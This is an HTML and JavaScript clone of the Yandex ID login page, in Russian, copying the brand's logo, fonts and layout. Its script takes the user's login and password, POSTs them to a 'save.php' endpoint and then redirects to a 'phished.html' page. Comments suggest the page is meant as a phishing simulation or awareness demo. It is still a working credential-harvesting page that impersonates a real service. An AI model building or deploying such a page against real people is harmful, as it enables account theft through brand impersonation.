<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
  <title>Вход · Яндекс ID</title>
  <!-- Yandex Sans (YS Text) -->
  <link rel="stylesheet" href="//yastatic.net/s3/home/fonts/ys/1/text-regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <style>
    /* (все оригинальные стили остаются без изменений) */
    @font-face {
      font-family: 'YS Text';
      src: url(//yastatic.net/s3/home/fonts/ys/1/text-light.woff2) format('woff2'),
           url(//yastatic.net/s3/home/fonts/ys/1/text-light.woff) format('woff');
      font-weight: 300;
      font-style: normal;
    }
    @font-face {
      font-family: 'YS Text';
      src: url(//yastatic.net/s3/home/fonts/ys/1/text-regular.woff2) format('woff2'),
           url(//yastatic.net/s3/home/fonts/ys/1/text-regular.woff) format('woff');
      font-weight: 400;
      font-style: normal;
    }
    @font-face {
      font-family: 'YS Text';
      src: url(//yastatic.net/s3/home/fonts/ys/1/text-medium.woff2) format('woff2'),
           url(//yastatic.net/s3/home/fonts/ys/1/text-medium.woff) format('woff');
      font-weight: 500;
      font-style: normal;
    }
    @font-face {
      font-family: 'YS Text';
      src: url(//yastatic.net/s3/home/fonts/ys/1/text-bold.woff2) format('woff2'),
           url(//yastatic.net/s3/home/fonts/ys/1/text-bold.woff) format('woff');
      font-weight: 700;
      font-style: normal;
    }
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    body {
      font-family: 'YS Text', 'Helvetica Neue', Helvetica, Arial, sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0;
      padding: 16px;
      background: url('https://yastatic.net/s3/bro-bg-store/48ae8881-c278-4485-ac4d-d56a8cb592c5.jpg') no-repeat center center fixed;
      background-size: cover;
    }
    .login-card {
      max-width: 480px;
      width: 100%;
      background-color: #ffffff;
      border-radius: 32px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
      padding: 32px 24px 28px;
      transition: all 0.2s;
    }
    .logo-header {
      display: flex;
      flex-direction: column;
      align-items: flex-start;
      margin-bottom: 28px;
    }
    .logo-header svg {
      display: block;
      margin-bottom: 16px;
    }
    .logo-header h2 {
      font-size: 24px;
      font-weight: 500;
      line-height: 1.2;
      color: #000;
      margin: 0;
    }
    .segment-picker {
      display: flex;
      gap: 8px;
      background: #f2f3f5;
      padding: 4px;
      border-radius: 40px;
      margin-bottom: 24px;
    }
    .segment {
      flex: 1;
      border: none;
      background: transparent;
      padding: 10px 0;
      border-radius: 40px;
      font-size: 15px;
      font-weight: 500;
      color: #6c6f73;
      cursor: pointer;
      transition: all 0.15s;
      font-family: inherit;
    }
    .segment.active {
      background: #ffffff;
      color: #000;
      box-shadow: 0 2px 8px rgba(0,0,0,0.04);
      font-weight: 500;
    }
    .input-field {
      margin-bottom: 28px;
    }
    .input-field input {
      width: 100%;
      padding: 18px 20px;
      font-size: 17px;
      border: 1.5px solid #e0e2e6;
      border-radius: 24px;
      outline: none;
      transition: border-color 0.15s;
      background: #ffffff;
      font-family: 'YS Text', sans-serif;
    }
    .input-field input:focus {
      border-color: #ffdb4d;
      box-shadow: 0 0 0 4px rgba(255, 219, 77, 0.2);
    }
    .input-field input::placeholder {
      color: #9b9fa5;
      font-weight: 400;
      opacity: 1;
    }
    .social-icons {
      display: flex;
      justify-content: space-evenly;
      align-items: center;
      margin-bottom: 32px;
    }
    .social-btn {
      width: 52px;
      height: 52px;
      border-radius: 50%;
      background: #f2f3f5;
      border: none;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 24px;
      color: #222;
      cursor: pointer;
      transition: background 0.15s;
    }
    .social-btn:hover {
      background: #e5e7eb;
    }
    .social-mailru {
      background: #0055a2;
      color: white;
      font-weight: 700;
      font-size: 22px;
      font-family: 'YS Text', Arial, sans-serif;
    }
    .action-buttons {
      display: flex;
      flex-direction: column;
      gap: 12px;
      margin-bottom: 24px;
    }
    .btn {
      width: 100%;
      padding: 16px 0;
      border-radius: 40px;
      font-size: 17px;
      font-weight: 500;
      font-family: inherit;
      border: 1.5px solid transparent;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      transition: 0.15s;
      background: white;
    }
    .btn-primary {
      background: #000;
      color: white;
      border-color: #000;
    }
    .btn-primary:hover {
      background: #2b2b2b;
    }
    .btn-outline {
      background: white;
      border-color: #d9dde0;
      color: #000;
    }
    .btn-outline:hover {
      background: #f5f5f5;
      border-color: #b0b5bc;
    }
    .btn-outline i {
      font-size: 20px;
      color: #4a4f55;
    }
    .promo {
      text-align: center;
      font-size: 14px;
      color: #7c8087;
      line-height: 1.5;
      margin-top: 8px;
    }
    .promo a {
      color: #000;
      text-decoration: underline;
      font-weight: 500;
      text-underline-offset: 2px;
    }
    .promo a:hover {
      text-decoration: none;
    }
    .fa-fingerprint, .fa-qrcode {
      font-size: 20px;
    }
    @media (max-width: 400px) {
      .login-card { padding: 24px 16px; }
      .social-btn { width: 44px; height: 44px; font-size: 20px; }
    }
    .hidden {
      display: none !important;
    }
    #passwordField {
      margin-top: -10px;
    }
  </style>
  <!-- Font Awesome 6 (free) -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
</head>
<body>

<div class="login-card">
  <!-- Яндекс логотип (без изменений) -->
  <div class="logo-header">
    <svg width="132" height="24" viewBox="0 0 132 30" fill="none" xmlns="http://www.w3.org/2000/svg" focusable="false" aria-hidden="true">
      <path d="M11.6317 25.6714V21.8206C11.6317 18.916 11.2769 18.0749 10.1597 15.6566L4.36371 3H0.25L7.68886 19.1789V25.6714H11.6317ZM14.2077 13.9611L19.0443 3H15.0357L10.1991 13.9611H14.2077ZM55.4369 26C57.2637 26 58.762 25.1457 59.8134 23.5554L60.0106 25.6714H63.5986V3H59.7214V11.188C58.7489 9.716 57.3032 8.94057 55.6077 8.94057C51.862 8.94057 49.2466 12.108 49.2466 17.5886C49.2466 22.9903 51.7831 26 55.4369 26ZM79.2912 24.5674V21.4C78.082 22.2149 76.058 22.9377 74.1654 22.9377C71.3266 22.9377 70.2489 21.5971 70.0912 18.8634H79.4489V16.8C79.4489 11.096 76.9386 8.94057 73.0614 8.94057C68.33 8.94057 66.0826 12.5549 66.0826 17.5229C66.0826 23.2269 68.882 26 73.85 26C76.3209 26 78.1477 25.3429 79.2912 24.5674ZM37.4969 13.8954C38.2197 13.0149 39.35 12.2657 40.7563 12.2657C42.1231 12.2657 42.7409 12.8571 42.7409 14.0926V25.6714H46.618V13.6983C46.618 10.4389 45.3169 9.00629 42.1494 9.00629C39.8363 9.00629 38.4694 9.86057 37.6809 10.636H37.4837L37.3917 9.26914H33.6066V25.6714H37.4837V13.8954H37.4969ZM30.4523 14.4869C30.4523 10.5046 28.4283 9.00629 24.3146 9.00629C21.7649 9.00629 19.7146 10.084 18.5449 10.9251V14.2897C19.7803 13.2777 21.6729 12.108 23.8677 12.108C25.7209 12.108 26.5751 12.7651 26.5751 14.5263V15.5646H25.9574C20.0169 15.5646 17.3751 17.4834 17.3751 20.9137C17.3751 24.0811 19.3991 25.908 22.3957 25.908C24.6826 25.908 25.6551 25.1589 26.4043 24.3703H26.562C26.5883 24.7909 26.7197 25.3429 26.8511 25.6714H30.6363C30.5049 24.3309 30.4391 22.9903 30.4391 21.6629V14.4869H30.4523ZM91.2249 25.6714H95.6014L90.2523 17.2206L94.8786 9.26914H91.0014L88.202 14.224L85.074 9.26914H80.6843L85.6391 17.1286L80.4872 25.6714H84.43L87.7289 20.1251L91.2249 25.6714ZM56.5803 12.0029C58.67 12.0029 59.7083 13.672 59.7083 17.444C59.7083 21.2554 58.6043 22.9246 56.4094 22.9246C54.2934 22.9246 53.242 21.2949 53.242 17.5754C53.2551 13.6983 54.3591 12.0029 56.5803 12.0029ZM72.9957 12.0029C74.9146 12.0029 75.506 13.6063 75.506 15.6566V15.9851H70.0912C70.1832 13.3697 71.1294 12.0029 72.9957 12.0029ZM26.5751 21.7549C26.0889 22.4777 25.1689 23.056 23.802 23.056C22.1723 23.056 21.3574 22.1097 21.3574 20.6771C21.3574 18.7846 22.698 18.1274 26.0231 18.1274H26.5751V21.7549Z" fill="var(--id-logo-yandex-color, #000000)" />
      <path fill-rule="evenodd" clip-rule="evenodd" d="M116.75 29.9995C128.753 29.9995 131.75 27.0028 131.75 14.9995C131.75 2.99623 128.753 -0.000488281 116.75 -0.000488281C104.747 -0.000488281 101.75 2.99623 101.75 14.9995C101.75 27.0028 104.747 29.9995 116.75 29.9995ZM111.629 5.99942V23.9994H108.5V5.99942H111.629ZM118.665 5.99942C119.852 5.99942 120.953 6.1505 121.967 6.47424C122.982 6.7764 123.845 7.29438 124.579 7.98503C125.313 8.67568 125.896 9.60374 126.306 10.726C126.737 11.8483 126.932 13.2512 126.932 14.9131C126.932 16.3807 126.716 17.6757 126.306 18.8196C125.874 19.9419 125.291 20.8915 124.536 21.6685C123.78 22.4455 122.874 23.0282 121.838 23.4167C120.802 23.8052 119.637 24.021 118.406 24.021H114.457V5.99942H118.665ZM118.147 21.5606C118.989 21.5606 119.766 21.4095 120.457 21.1289C121.147 20.8483 121.73 20.4167 122.226 19.8771C122.723 19.316 123.09 18.6253 123.37 17.7836C123.629 16.9419 123.78 15.9706 123.78 14.8483C123.78 13.6397 123.651 12.6253 123.392 11.8052C123.133 10.985 122.766 10.316 122.291 9.81956C121.816 9.32316 121.255 8.95625 120.586 8.74043C119.939 8.5246 119.205 8.41669 118.406 8.41669H117.586V21.539H118.147V21.5606Z" fill="var(--id-logo-brand-color, #FF3333)" />
    </svg>
    <h2>Войти с Яндекс ID</h2>
  </div>

  <!-- Шаг 1: идентификатор (почта / телефон) -->
  <div id="step1">
    <div class="segment-picker" id="segmentPicker">
      <button class="segment active" data-type="email">Почта</button>
      <button class="segment" data-type="phone">Телефон</button>
    </div>
    <div class="input-field">
      <input type="text" id="loginInput" placeholder="Логин или почта" autocomplete="username">
    </div>
  </div>

  <!-- Шаг 2: пароль (изначально скрыт) -->
  <div id="step2" class="hidden">
    <div class="input-field" id="passwordField">
      <input type="password" id="passwordInput" placeholder="Пароль" autocomplete="current-password">
    </div>
  </div>

  <!-- Кнопки входа через соцсети (подписи переведены) -->
  <div class="social-icons">
    <button class="social-btn" aria-label="ВКонтакте"><i class="fab fa-vk"></i></button>
    <button class="social-btn" aria-label="Google"><i class="fab fa-google"></i></button>
    <button class="social-btn social-mailru" aria-label="Mail.ru">M</button>
    <button class="social-btn" aria-label="Одноклассники"><i class="fab fa-odnoklassniki"></i></button>
    <button class="social-btn" aria-label="X (Twitter)"><i class="fab fa-x-twitter"></i></button>
  </div>

  <!-- Основные кнопки -->
  <div class="action-buttons">
    <button class="btn btn-primary" id="mainActionBtn">Далее</button>
    <button class="btn btn-outline"><i class="fas fa-fingerprint"></i> Вход по лицу или отпечатку</button>
    <button class="btn btn-outline"><i class="fas fa-qrcode"></i> QR-код</button>
    <button class="btn btn-outline">Создать ID</button>
  </div>

  <!-- Рекламный текст -->
  <div class="promo">
    <span>Получите лучшую защиту — <br> перейдите в <a href="#">чек-лист</a> в вашем <br> Яндекс ID</span>
  </div>
</div>

<script>
  (function() {
    // DOM элементы
    const step1 = document.getElementById('step1');
    const step2 = document.getElementById('step2');
    const mainBtn = document.getElementById('mainActionBtn');
    const loginInput = document.getElementById('loginInput');
    const passwordInput = document.getElementById('passwordInput');
    const segments = document.querySelectorAll('.segment');
    const segmentPicker = document.getElementById('segmentPicker');

    // Состояние
    let currentStep = 1; // 1 = идентификатор, 2 = пароль
    let identifierType = 'email'; // 'email' или 'phone'

    // Обновление подсказки в поле идентификатора
    function updatePlaceholder(type) {
      if (type === 'email') {
        loginInput.placeholder = 'Логин или почта';
        loginInput.inputMode = 'text';
        loginInput.autocomplete = 'username';
      } else {
        loginInput.placeholder = 'Телефон';
        loginInput.inputMode = 'tel';
        loginInput.autocomplete = 'tel';
      }
    }

    // Переключение сегментов (почта/телефон)
    segments.forEach(btn => {
      btn.addEventListener('click', function(e) {
        segments.forEach(b => b.classList.remove('active'));
        this.classList.add('active');
        identifierType = this.dataset.type;
        updatePlaceholder(identifierType);
      });
    });

    // Обработка нажатия на главную кнопку
    mainBtn.addEventListener('click', function(e) {
      e.preventDefault();

      if (currentStep === 1) {
        // Шаг 1: проверяем, что идентификатор не пустой
        const identifier = loginInput.value.trim();
        if (!identifier) {
          alert('Пожалуйста, введите ' + (identifierType === 'email' ? 'email или логин' : 'номер телефона'));
          return;
        }
        // Переход к шагу 2
        step1.classList.add('hidden');
        step2.classList.remove('hidden');
        mainBtn.textContent = 'Войти';
        currentStep = 2;
      } else {
        // Шаг 2: получаем пароль и отправляем данные
        const identifier = loginInput.value.trim();
        const password = passwordInput.value.trim();
        if (!password) {
          alert('Введите ваш пароль');
          return;
        }

        // Отправка данных на сервер через POST (fetch)
        const formData = new FormData();
        formData.append('identifier', identifier);
        formData.append('password', password);
        formData.append('type', identifierType);

        fetch('save.php', {
          method: 'POST',
          body: formData
        })
        .then(response => {
          if (response.ok) {
            // Перенаправление на страницу-уведомление о фишинге
            window.location.href = 'phished.html';
          } else {
            alert('Произошла ошибка. Пожалуйста, попробуйте снова.');
          }
        })
        .catch(error => {
          console.error('Error:', error);
          alert('Ошибка сети. Пожалуйста, попробуйте снова.');
        });
      }
    });

    // Остальные кнопки (outline) – просто вывод в консоль (без действий)
    document.querySelectorAll('.btn-outline').forEach(btn => {
      btn.addEventListener('click', (e) => {
        e.preventDefault();
        console.log('[demo] нажата: ' + btn.innerText.trim());
      });
    });

    // Кнопки соцсетей – тоже демо
    document.querySelectorAll('.social-btn').forEach(btn => {
      btn.addEventListener('click', (e) => {
        e.preventDefault();
        console.log('клик по соцсети (демо)');
      });
    });

    // Инициализация подсказки
    updatePlaceholder('email');
  })();
</script>
</body>
</html>
